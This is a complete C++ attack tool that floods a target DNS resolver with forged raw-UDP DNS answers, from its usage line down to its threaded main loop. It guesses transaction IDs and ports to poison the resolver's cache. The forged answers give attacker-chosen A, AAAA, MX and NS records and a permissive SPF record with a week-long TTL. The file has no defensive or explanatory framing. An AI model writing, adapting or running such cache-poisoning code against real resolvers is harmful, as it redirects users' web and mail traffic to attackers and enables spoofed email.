// Compile: g++ -o any_amp any_amp.cpp -lpthread
// Run: sudo ./any_amp <target_dns> <domain> <spoof_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <atomic>

class ANYAmplificationPoison {
private:
    std::string targetDNS, domain, spoofIP;
    std::atomic<uint16_t> txid{0};
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    ANYAmplificationPoison(const std::string& dns, const std::string& d,
                           const std::string& spoof)
        : targetDNS(dns), domain(d), spoofIP(spoof) {}
    
    // Reply to ANY query with ALL record types poisoned
    // Much more data, higher chance of matching recursive resolver's query
    void sendANYResponse(uint16_t txidVal, uint16_t dstPort) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        char packet[1024];
        memset(packet, 0, sizeof(packet));
        
        struct iphdr* ip = (struct iphdr*)packet;
        struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
        char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
        
        *(uint16_t*)(dns + 0) = htons(txidVal);
        *(uint16_t*)(dns + 2) = htons(0x8180);
        *(uint16_t*)(dns + 4) = htons(1);  // QDCOUNT
        *(uint16_t*)(dns + 6) = htons(5);  // ANCOUNT (many records!)
        *(uint16_t*)(dns + 8) = htons(0);
        *(uint16_t*)(dns + 10) = htons(0);
        
        int pos = 12;
        
        // Question
        pos += encodeName(dns + pos, domain);
        *(uint16_t*)(dns + pos) = htons(255); pos += 2;  // ANY
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        
        struct in_addr addr;
        inet_aton(spoofIP.c_str(), &addr);
        
        // A record
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(4); pos += 2;
        memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
        
        // AAAA record with mapped IPv4
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(28); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        *(uint16_t*)(dns + pos) = htons(16); pos += 2;
        struct in6_addr ipv6 = {};
        ipv6.s6_addr[10] = 0xFF; ipv6.s6_addr[11] = 0xFF;
        memcpy(ipv6.s6_addr + 12, &addr.s_addr, 4);
        memcpy(dns + pos, ipv6.s6_addr, 16); pos += 16;
        
        // MX record
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(15); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        int mxLenPos = pos; pos += 2;
        int mxStart = pos;
        *(uint16_t*)(dns + pos) = htons(0); pos += 2;
        pos += encodeName(dns + pos, "mail." + domain);
        *(uint16_t*)(dns + mxLenPos) = htons(pos - mxStart);
        
        // NS record
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(2); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        int nsLenPos = pos; pos += 2;
        int nsStart = pos;
        pos += encodeName(dns + pos, "ns." + domain);
        *(uint16_t*)(dns + nsLenPos) = htons(pos - nsStart);
        
        // TXT record
        *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
        *(uint16_t*)(dns + pos) = htons(16); pos += 2;
        *(uint16_t*)(dns + pos) = htons(1); pos += 2;
        *(uint32_t*)(dns + pos) = htonl(604800); pos += 4;
        const char* txtData = "v=spf1 +all";
        *(uint16_t*)(dns + pos) = htons(strlen(txtData) + 1); pos += 2;
        dns[pos++] = strlen(txtData);
        memcpy(dns + pos, txtData, strlen(txtData));
        pos += strlen(txtData);
        
        udp->source = htons(53);
        udp->dest = htons(dstPort);
        udp->len = htons(sizeof(struct udphdr) + pos);
        udp->check = 0;
        
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->saddr = inet_addr(targetDNS.c_str());
        ip->daddr = inet_addr(targetDNS.c_str());
        ip->check = 0;
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(dstPort);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        close(sock);
    }
    
    void floodThread() {
        while (true) {
            uint16_t id = txid.fetch_add(1) & 0xFFFF;
            uint16_t port = 1024 + (rand() % 64000);
            sendANYResponse(id, port);
        }
    }
    
    void run(int threads = 10) {
        std::cout << "[*] ANY query amplification poisoning with " 
                  << threads << " threads\n";
        
        std::vector<std::thread> workers;
        for (int i = 0; i < threads; i++) {
            workers.emplace_back([this]() { floodThread(); });
        }
        
        for (auto& w : workers) w.join();
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <dns> <domain> <spoof_ip>\n";
        return 1;
    }
    srand(time(NULL));
    ANYAmplificationPoison poison(argv[1], argv[2], argv[3]);
    poison.run(10);
    return 0;
}
